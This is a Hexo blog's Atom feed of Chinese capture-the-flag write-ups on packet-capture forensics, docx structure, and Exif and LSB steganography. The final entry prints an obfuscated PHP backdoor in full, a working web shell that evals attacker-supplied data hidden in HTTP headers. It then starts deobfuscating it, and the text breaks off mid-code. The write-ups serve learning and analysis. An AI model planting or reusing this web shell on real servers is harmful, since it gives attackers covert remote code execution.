<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kiona</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://kkkiona.github.io/"/>
  <updated>2019-04-21T02:59:09.337Z</updated>
  <id>https://kkkiona.github.io/</id>
  
  <author>
    <name>Kiona</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>数据包文件包含</title>
    <link href="https://kkkiona.github.io/2019/04/21/%E6%95%B0%E6%8D%AE%E5%8C%85%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://kkkiona.github.io/2019/04/21/数据包文件包含/</id>
    <published>2019-04-21T01:54:27.000Z</published>
    <updated>2019-04-21T02:59:09.337Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这也是一道关于数据抓包文件分析的题目。</p><p><strong>题目</strong></p><p>题目给出了一个抓包数据。<br><img src="/2019/04/21/数据包文件包含/Image0001.png" alt><br><a id="more"></a><br>通过对各项目的大致浏览发现，并没有明显的图片，音频等媒体文件的传输。尝试各项提取果然也没有结果。<br><img src="/2019/04/21/数据包文件包含/Image0002.png" alt><br>尝试跟踪TCP。<br><img src="/2019/04/21/数据包文件包含/Image0003.png" alt><br>并没有有价值的信息。<br>看到题目提示 <strong>something about file</strong> ，联想到之前的文件隐藏，猜测可能包含了其他文件。</p><p>利用cmd的copy指令可以将两个文件关联在一起，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b a.zip+b.jpg c.jpg</span><br></pre></td></tr></table></figure></p><p>这会生成一个c.jpg文件，通过把文件后缀改回zip可以提取出b.jpg。但是本题的文件并不适合修改后缀名的做法。也就是说它并不是通过打包为压缩文件的方式实现的。</p><p>可以使用binwalk进行分析。</p><p>在kali Linux里面使用binwalk分析结果<br><img src="/2019/04/21/数据包文件包含/Image0004.png" alt><br>binwalk的结果显示<strong>194314—— 0x2F70A</strong>这段位置，存储了一个flag.txt文件。</p><p><strong>提取方法一</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e 文件名</span><br></pre></td></tr></table></figure></p><p><img src="/2019/04/21/数据包文件包含/Image0005.png" alt><br><strong>提取方法二</strong></p><p>binwalk -e 是按照binwalk配置文件预定义的提取方式提取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=输入文件 of=输出文件 skip=跳过单元 bs=读取大小 count=读取总数</span><br></pre></td></tr></table></figure><p>也可以使用dd指令提取文件。<br><strong>提取方法三</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install foremost //如果没有安装过 需要先安装foremost</span><br><span class="line">foremost 文件</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这也是一道关于数据抓包文件分析的题目。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题目&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;题目给出了一个抓包数据。&lt;br&gt;&lt;img src=&quot;/2019/04/21/数据包文件包含/Image0001.png&quot; alt&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>流量分析题</title>
    <link href="https://kkkiona.github.io/2019/04/20/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%98/"/>
    <id>https://kkkiona.github.io/2019/04/20/流量分析题/</id>
    <published>2019-04-20T07:42:36.000Z</published>
    <updated>2019-04-20T09:38:58.107Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这是一一道基础的流量分析题目，从题目可以得到一个pcapng数据包文件，可以通过wireshark来查看抓包数据。（<a href="https://www.wireshark.org/）" target="_blank" rel="noopener">https://www.wireshark.org/）</a></p><p><img src="/2019/04/20/流量分析题/Image0001.png" alt><br><a id="more"></a><br>题目提示注意http字段，我们可以在过滤器里面输入http进行过滤。</p><p><img src="/2019/04/20/流量分析题/Image0002.png" alt></p><p>可以看到传输了许多数据，有html文件，ico等，最引人瞩目的因该是最后变得png文件了。</p><p><img src="/2019/04/20/流量分析题/Image0003.png" alt></p><p>通过对照常用文件的16进制开头也可以看出这里确实有一个png文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，文件头：FFD8FF</span><br><span class="line">PNG (png)，文件头：89504E47</span><br><span class="line">GIF (gif)，文件头：47494638</span><br><span class="line">TIFF (tif)，文件头：49492A00</span><br><span class="line">Windows Bitmap (bmp)，文件头：424D</span><br><span class="line">CAD (dwg)，文件头：41433130</span><br><span class="line">Adobe Photoshop (psd)，文件头：38425053</span><br><span class="line">Rich Text Format (rtf)，文件头：7B5C727466</span><br><span class="line">XML (xml)，文件头：3C3F786D6C</span><br><span class="line">HTML (html)，文件头：68746D6C3E</span><br><span class="line">Email [thorough only] (eml)，文件头：44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)，文件头：CFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)，文件头：2142444E</span><br><span class="line">MS Word/Excel (xls.or.doc)，文件头：D0CF11E0</span><br><span class="line">MS Access (mdb)，文件头：5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)，文件头：FF575043</span><br><span class="line">Adobe Acrobat (pdf)，文件头：255044462D312E</span><br><span class="line">Quicken (qdf)，文件头：AC9EBD8F</span><br><span class="line">Windows Password (pwl)，文件头：E3828596</span><br><span class="line">ZIP Archive (zip)，文件头：504B0304</span><br><span class="line">RAR Archive (rar)，文件头：52617221</span><br><span class="line">Wave (wav)，文件头：57415645</span><br><span class="line">AVI (avi)，文件头：41564920</span><br><span class="line">Real Audio (ram)，文件头：2E7261FD</span><br><span class="line">Real Media (rm)，文件头：2E524D46</span><br><span class="line">MPEG (mpg)，文件头：000001BA</span><br><span class="line">MPEG (mpg)，文件头：000001B3</span><br><span class="line">Quicktime (mov)，文件头：6D6F6F76</span><br><span class="line">Windows Media (asf)，文件头：3026B2758E66CF11</span><br></pre></td></tr></table></figure><p>wireshark提供了一个功能可以直接提取数据包里的文件，<strong>文件-&gt;导出对象-&gt;HTTP</strong>。</p><p><img src="/2019/04/20/流量分析题/Image0004.png" alt></p><p>选择最后的png图片保存。</p><p><img src="/2019/04/20/流量分析题/Image0005.png" alt></p><p>找到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一一道基础的流量分析题目，从题目可以得到一个pcapng数据包文件，可以通过wireshark来查看抓包数据。（&lt;a href=&quot;https://www.wireshark.org/）&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.wireshark.org/）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/04/20/流量分析题/Image0001.png&quot; alt&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>docx文件</title>
    <link href="https://kkkiona.github.io/2019/04/18/docx%E6%96%87%E4%BB%B6/"/>
    <id>https://kkkiona.github.io/2019/04/18/docx文件/</id>
    <published>2019-04-18T06:48:37.000Z</published>
    <updated>2019-04-18T06:58:05.494Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这是一道基础题，旨在考察Word docx 文件的本质。<br><img src="/2019/04/18/docx文件/Image0001.png" alt></p><p>题目给出了一个docx文件，里面是一段文言文。解题关键在于了解什么是docx。<br><a id="more"></a></p><p>docx是Microsoft Office2007之后版本使用的，用新的基于XML的压缩文件格式取代了其目前专有的默认文件格式，在传统的文件名扩展名后面添加了字母“x”（即“.docx”取代“.doc”、“.xlsx”取代“.xls”、“.pptx”取代“.ppt”）。docx文件比doc文件所占用空间更小 。</p><p>docx格式的文件本质上是一个ZIP文件。将一个docx文件的后缀改为ZIP后是可以用解压工具打开或是解压的。事实上，Word2007的基本文件就是ZIP格式的，他可以算作是docx文件的容器。<br>docx 格式文件的主要内容是保存为XML格式的，但文件并非直接保存于磁盘。它是保存在一个ZIP文件中，然后取扩展名为docx。将.docx 格式的文件后缀改为ZIP后解压, 可以看到解压出来的文件夹中有word这样一个文件夹，它包含了Word文档的大部分内容。而其中的document.xml文件则包含了文档的主要文本内容。<br>（摘自百度百科）</p><p>文档说的很清楚，docx文件是对doc文件的升级，是xml的压缩文件格式，实质上就是一个可以被office等文件使用的zip压缩包。</p><p>那我们把题目文件改成zip格式看一下<br><img src="/2019/04/18/docx文件/Image0002.png" alt><br>可以看到flag文件，同时也可以找到文档内容文件<br><img src="/2019/04/18/docx文件/Image0003.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一道基础题，旨在考察Word docx 文件的本质。&lt;br&gt;&lt;img src=&quot;/2019/04/18/docx文件/Image0001.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;题目给出了一个docx文件，里面是一段文言文。解题关键在于了解什么是docx。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Exif隐写题</title>
    <link href="https://kkkiona.github.io/2019/04/18/Exif%E9%9A%90%E5%86%99%E9%A2%98/"/>
    <id>https://kkkiona.github.io/2019/04/18/Exif隐写题/</id>
    <published>2019-04-18T06:30:06.000Z</published>
    <updated>2019-04-18T06:46:03.345Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这是一道简单的隐写题目，并且提示了是Exif隐写。</p><p><strong>题目</strong></p><p><img src="/2019/04/18/Exif隐写题/Image0001.png" alt></p><p>题目给出了一张图片。<br><a id="more"></a><br>先来看一下什么是Exif。</p><p>可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。<br>Exif最初由日本电子工业发展协会在1996年制定，版本为1.0。1998年，升级到2.1，增加了对音频文件的支持。2002年3月，发表了2.2版。<br>Exif可以附加于JPEG、TIFF、RIFF等文件之中，为其增加有关数码相机拍摄信息的内容和索引图或图像处理软件的版本信息。<br>Windows 7操作系统具备对Exif的原生支持，通过鼠标右键点击图片打开菜单，点击属性并切换到详细信息标签下即可直接查看Exif信息。<br>Exif信息是可以被任意编辑的，因此只有参考的功能。Exif信息以0xFFE1作为开头标记，后两个字节表示Exif信息的长度。所以Exif信息最大为64 kb，而内部采用TIFF格式。<br>（摘自百度百科）</p><p>简单来说就是给图片添加了一些详细的信息。可以查看Exif信息的工具有很多，本身直接查看文件属性里面也会有所涉及但是不一定全面，推荐使用工具查看。</p><p>直接查看详细信息：<br><img src="/2019/04/18/Exif隐写题/Image0002.png" alt><br>使用工具（<a href="https://exif.tuchong.com）：" target="_blank" rel="noopener">https://exif.tuchong.com）：</a><br><img src="/2019/04/18/Exif隐写题/Image0003.png" alt></p><p>仔细查看各个数据之后，发现了比较可疑的信息<br><img src="/2019/04/18/Exif隐写题/Image0004.png" alt></p><p>经过测试发现这是ASCII码的十进制。自己转换一下就可以得到flag了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一道简单的隐写题目，并且提示了是Exif隐写。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题目&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/04/18/Exif隐写题/Image0001.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;题目给出了一张图片。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LSB-图片隐写</title>
    <link href="https://kkkiona.github.io/2019/04/17/LSB-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
    <id>https://kkkiona.github.io/2019/04/17/LSB-图片隐写/</id>
    <published>2019-04-17T11:22:18.000Z</published>
    <updated>2019-04-17T12:04:25.390Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="/2019/04/17/LSB-图片隐写/Image001.png" alt></p><p>这是一道基础的图片隐写题目，题目告诉我们flag就在图片里面，并且提示了是LSB。</p><p>那么既然如此就需要先搞清楚什么是LSB：</p><p>最低有效位（the least significant bit，lsb）是指一个二进制数字中的第0位（即最低位），具有权值为2^0，可以用它来检测数的奇偶性。与之相反的称之为最高有效位。在大端序中，lsb指最右边的位。最低有效位代表二进制数中的最小的单位，可以用来指示数字很小的变化。LSB（全大写）有时也指Least Significant Byte，指多字节序列中最小权重的字节。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 0 0 0 0 0 1</span><br></pre></td></tr></table></figure></p><p>比如这一个字节的存储单元里面 最后的1就是最低有效位。通俗点就是大段存储最低就在右边反之左边。</p><a id="more"></a><p>最高有效位（the Most Significant Bit，msb），是指一个n位二进制数字中的n-1位，具有最高的权值2^n − 1。与之相反的称之为最低有效位。在大端序中，msb即指最左端的位。对于有符号二进制数，负数采用反码或补码形式，此时msb用来表示符号，msb为1表示负数，0表示正数。MSB（全大写）有时也指the Most Significant Byte，指多字节序列中具有最大权重的字节。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 0 0 0 0 0 0 0</span><br></pre></td></tr></table></figure><p>1为最高有效位，大端序的时候最高有效位在左边，反之在右边。</p><p>那么对于这道题目来说，LSB有什么用呢。我们先来看一张图片。</p><p><img src="/2019/04/17/LSB-图片隐写/Image002.png" alt></p><p>比如上图绿色的二进制表示是<strong>11101011</strong>，但是我们修改了最后一位数字使其减小3变成了<strong>11101000</strong>但是视觉上依然是那个绿色。</p><p>这样一来我们就可以把有用的信息放到最低有效位来实现信息隐藏，表面看是一张图片，实则把所有最低位连起来里面隐含了信息。</p><p>当然，有时候我们存储的信息可能比较多，但是供我们使用的字段又有限，我们也可以使用最低两位，但是随着改变位数的增加，隐藏的效果也会越差，道理很明显，改变的越多，色相差的也就越多。</p><p>如何来获取隐藏信息并不困难，因为我们有神器–<strong>StegSolve</strong>，它允许我们关闭RGB三色通道的任何一个通道来查看图片，也可以按位逐一查看图片情况。</p><p>链接：<a href="https://pan.baidu.com/s/1oZa2pPlF53aPodY-Dcd8FA" target="_blank" rel="noopener">https://pan.baidu.com/s/1oZa2pPlF53aPodY-Dcd8FA</a> 提取码：2gwb </p><p><img src="/2019/04/17/LSB-图片隐写/Image003.png" alt></p><p>通过左右试探各个通道，最终找到了存储flag的二维码。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2019/04/17/LSB-图片隐写/Image001.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;这是一道基础的图片隐写题目，题目告诉我们flag就在图片里面，并且提示了是LSB。&lt;/p&gt;
&lt;p&gt;那么既然如此就需要先搞清楚什么是LSB：&lt;/p&gt;
&lt;p&gt;最低有效位（the least significant bit，lsb）是指一个二进制数字中的第0位（即最低位），具有权值为2^0，可以用它来检测数的奇偶性。与之相反的称之为最高有效位。在大端序中，lsb指最右边的位。最低有效位代表二进制数中的最小的单位，可以用来指示数字很小的变化。LSB（全大写）有时也指Least Significant Byte，指多字节序列中最小权重的字节。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0 0 0 0 0 0 0 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;比如这一个字节的存储单元里面 最后的1就是最低有效位。通俗点就是大段存储最低就在右边反之左边。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>后门利用题目</title>
    <link href="https://kkkiona.github.io/2019/04/16/%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E9%A2%98%E7%9B%AE/"/>
    <id>https://kkkiona.github.io/2019/04/16/后门利用题目/</id>
    <published>2019-04-16T02:47:38.000Z</published>
    <updated>2019-04-16T10:08:05.918Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这是一道后门利用题目，程序开发人员预留了一个后门程序，我们需要通过这个后门程序来获取flag。</p><p><strong>题目</strong></p><p><img src="/2019/04/16/后门利用题目/Image0001.png" alt></p><p>题目说有三个页面，一个是我们现在看到的主页面index还有两个分别是我们需要获得的flag.php和可以利用的backdoor.php。</p><p>直接访问flag.php发现页面什么都没有，说明flag位于源码里面，我们需要通过后门程序读取flag.php的源码。</p><p>backdoor.php直接进入该页面也是什么都没有，说明它的调用方式是通过参数传递来实现的（想必谁也不会愚蠢到给自己的后门程序留一个明目张胆的登录界面吧！- -），所以该文件提供了源文件的下载。</p><p><strong>backdoor.php 源码</strong><br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Signature For Report</span><br><span class="line">*/$c=&apos;ue)ery)e&quot;],$q);$q=array_valu)ees($q);preg_)ema)etch_all()e&quot;/([\w]&apos;;/*</span><br><span class="line">*/$e=&apos;$i&lt;$l);$j++)e,$i++)&#123;$o.=$t&#123;)e$i&#125;^$k&#123;$j&#125;;&#125;&#125;retur)en )e$o;&#125;$r=$_SER&apos;;/*</span><br><span class="line">*/$G=&apos;o=ob_get_conte)ents();ob_e)end_cle)ean();$d=base)e64_encod)ee(x(g&apos;;/*</span><br><span class="line">*/$g=&apos;$)ekh)e=&quot;d0)e3a&quot;;$kf=&quot;1f3c&quot;;function x($t)e,$k)&#123;$c=strlen($k);$l=&apos;;/*</span><br><span class="line">*/$F=&apos;=strpos($s[)e$i],$f);)eif($e)&#123;$k=$kh.$kf;ob)e_sta)ert();@eval)e(@&apos;;/*</span><br><span class="line">*/$I=&apos;gz)eunco)empress(@)ex(@b)ease6)e4_decode(p)ere)eg_repl)eace()ear)&apos;;/*</span><br><span class="line">*/$h=&apos;_sta)ert();$s=&amp;$_SES)eSION;$ss=&quot;substr&quot;;$sl=&quot;s)etrtolower&quot;;$i=)e$&apos;;/*</span><br><span class="line">*/$K=&apos;U)eAGE&quot;];if($rr&amp;&amp;)e$ra)&#123;$u=pa)erse_url($rr))e;parse)e_str)e($u[&quot;q&apos;;/*</span><br><span class="line">*/$M=&apos;m[1][)e0].$m[1])e[1];$h=$sl($ss(m)ed5($i.$k)eh),0,3)e));$f=$sl($s&apos;;/*</span><br><span class="line">*/$C=&apos;s()emd5($i)e.$kf),0,3));$p=&quot;&quot;;)efor($z=1;$z&lt;count($m[1]);$z++)$p.&apos;;/*</span><br><span class="line">*/$n=&apos;)eVE)eR;$rr=@$r[&quot;HTTP_REFERE)eR&quot;)e];$ra=)e@$r[&quot;HTTP_AC)eCEPT_LANG&apos;;/*</span><br><span class="line">*/$p=&apos;=$q)e[$m[2][$z]];if(strpos()e$p)e,$)eh)===0)&#123;$s[$)ei])e=&quot;)e&quot;;$p=$&apos;;/*</span><br><span class="line">*/$s=&apos;zcompress($o),$k));print(&quot;&lt;$k&gt;$d&lt;/$)ek&gt;&quot;);@sess)eion_de)estroy();&apos;;/*</span><br><span class="line">*/$R=&apos;)ess($)ep,3))e;&#125;if(array_key_exists()e$i,$)es))e)&#123;$s)e[$i].=$p;$e&apos;;/*</span><br><span class="line">*/$V=&apos;strlen($t);$o=&quot;&quot;;f)eor($)ei=0;)e$i)e&lt;$l;)e)&#123;)efor($j=0)e;($j&lt;$c&amp;&amp;&apos;;/*</span><br><span class="line">*/$y=&apos;)[\w-]+(?:;q=0.([\d]))?)e,?/&quot;,$ra,$m);i)ef()e$q&amp;&amp;)e$m)&#123;@sessi)eon&apos;;/*</span><br><span class="line">*/$P=&apos;eray(&quot;/_/&quot;,&quot;/-/&quot;),array(&quot;/&quot;,&quot;+&quot;),$ss()e$s[$i],0)e,$e))),$)ek)));$&apos;;/*</span><br><span class="line">*/$t=&apos;&#125;&#125;&#125;&#125;&apos;;$Y=str_replace(&apos;b&apos;,&apos;&apos;,&apos;crbebbabte_funcbbtion&apos;);/*</span><br><span class="line">*/$L=str_replace(&apos;)e&apos;,&apos;&apos;,$g.$V.$e.$n.$K.$c.$y.$h.$M.$C.$p.$R.$F.$I.$P.$G.$s.$t);/*</span><br><span class="line"> */$v=$Y(&apos;&apos;,$L);$v();/*</span><br><span class="line"> */</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>是一段php代码，但是被压缩了，我们需要先恢复其格式，随便找个在线格式化工具。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$c = &apos;ue)ery)e&quot;],$q);$q=array_valu)ees($q);preg_)ema)etch_all()e&quot;/([\w]&apos;; </span><br><span class="line"></span><br><span class="line">$e = &apos;$i&lt;$l);$j++)e,$i++)&#123;$o.=$t&#123;)e$i&#125;^$k&#123;$j&#125;;&#125;&#125;retur)en )e$o;&#125;$r=$_SER&apos;; </span><br><span class="line"></span><br><span class="line">$G = &apos;o=ob_get_conte)ents();ob_e)end_cle)ean();$d=base)e64_encod)ee(x(g&apos;; </span><br><span class="line"></span><br><span class="line">$g = &apos;$)ekh)e=&quot;d0)e3a&quot;;$kf=&quot;1f3c&quot;;function x($t)e,$k)&#123;$c=strlen($k);$l=&apos;; </span><br><span class="line"></span><br><span class="line">$F = &apos;=strpos($s[)e$i],$f);)eif($e)&#123;$k=$kh.$kf;ob)e_sta)ert();@eval)e(@&apos;; </span><br><span class="line"></span><br><span class="line">$I = &apos;gz)eunco)empress(@)ex(@b)ease6)e4_decode(p)ere)eg_repl)eace()ear)&apos;; </span><br><span class="line"></span><br><span class="line">$h = &apos;_sta)ert();$s=&amp;$_SES)eSION;$ss=&quot;substr&quot;;$sl=&quot;s)etrtolower&quot;;$i=)e$&apos;; </span><br><span class="line"></span><br><span class="line">$K = &apos;U)eAGE&quot;];if($rr&amp;&amp;)e$ra)&#123;$u=pa)erse_url($rr))e;parse)e_str)e($u[&quot;q&apos;; </span><br><span class="line"></span><br><span class="line">$M = &apos;m[1][)e0].$m[1])e[1];$h=$sl($ss(m)ed5($i.$k)eh),0,3)e));$f=$sl($s&apos;; </span><br><span class="line"></span><br><span class="line">$C = &apos;s()emd5($i)e.$kf),0,3));$p=&quot;&quot;;)efor($z=1;$z&lt;count($m[1]);$z++)$p.&apos;; </span><br><span class="line"></span><br><span class="line">$n = &apos;)eVE)eR;$rr=@$r[&quot;HTTP_REFERE)eR&quot;)e];$ra=)e@$r[&quot;HTTP_AC)eCEPT_LANG&apos;; </span><br><span class="line"></span><br><span class="line">$p = &apos;=$q)e[$m[2][$z]];if(strpos()e$p)e,$)eh)===0)&#123;$s[$)ei])e=&quot;)e&quot;;$p=$&apos;; </span><br><span class="line"></span><br><span class="line">$s = &apos;zcompress($o),$k));print(&quot;&lt;$k&gt;$d&lt;/$)ek&gt;&quot;);@sess)eion_de)estroy();&apos;; </span><br><span class="line"></span><br><span class="line">$R = &apos;)ess($)ep,3))e;&#125;if(array_key_exists()e$i,$)es))e)&#123;$s)e[$i].=$p;$e&apos;; </span><br><span class="line"></span><br><span class="line">$V = &apos;strlen($t);$o=&quot;&quot;;f)eor($)ei=0;)e$i)e&lt;$l;)e)&#123;)efor($j=0)e;($j&lt;$c&amp;&amp;&apos;; </span><br><span class="line"></span><br><span class="line">$y = &apos;)[\w-]+(?:;q=0.([\d]))?)e,?/&quot;,$ra,$m);i)ef()e$q&amp;&amp;)e$m)&#123;@sessi)eon&apos;; </span><br><span class="line"></span><br><span class="line">$P = &apos;eray(&quot;/_/&quot;,&quot;/-/&quot;),array(&quot;/&quot;,&quot;+&quot;),$ss()e$s[$i],0)e,$e))),$)ek)));$&apos;; </span><br><span class="line"></span><br><span class="line">$t = &apos;&#125;&#125;&#125;&#125;&apos;;</span><br><span class="line">$Y = str_replace(&apos;b&apos;, &apos;&apos;, &apos;crbebbabte_funcbbtion&apos;); </span><br><span class="line"></span><br><span class="line">$L = str_replace(&apos;)e&apos;, &apos;&apos;, $g . $V . $e . $n . $K . $c . $y . $h . $M . $C . $p . $R . $F . $I . $P . $G . $s . $t); </span><br><span class="line"></span><br><span class="line">$v = $Y(&apos;&apos;, $L);</span><br><span class="line"></span><br><span class="line">$v(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>乍一看还是有点乱，但是盯住后边四行不难看出，倒数第四行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Y = str_replace(&apos;b&apos;, &apos;&apos;, &apos;crbebbabte_funcbbtion&apos;);</span><br></pre></td></tr></table></figure></p><p>意思是把字符串“crbebbabte_funcbbtion”里面的“b”去掉，也就是$Y值为create_function，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$v = $Y(&apos;&apos;, $L);</span><br><span class="line">$v();</span><br></pre></td></tr></table></figure><p>后两句话由此来看就变成了定义一个函数$v=create_function(),并且执行该函数，而函数内容就为$L。<br>可以看出$L同样是使用了字符替换的手段把前边定义的N个字符串进行了替换和拼接，我们只要把这个$L的值输出出来就可以知道这个function是什么原理了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$kh=&quot;d03a&quot;;$kf=&quot;1f3c&quot;;function x($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o=&quot;&quot;;for($i=0;$i&lt;$l;)&#123;for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;return 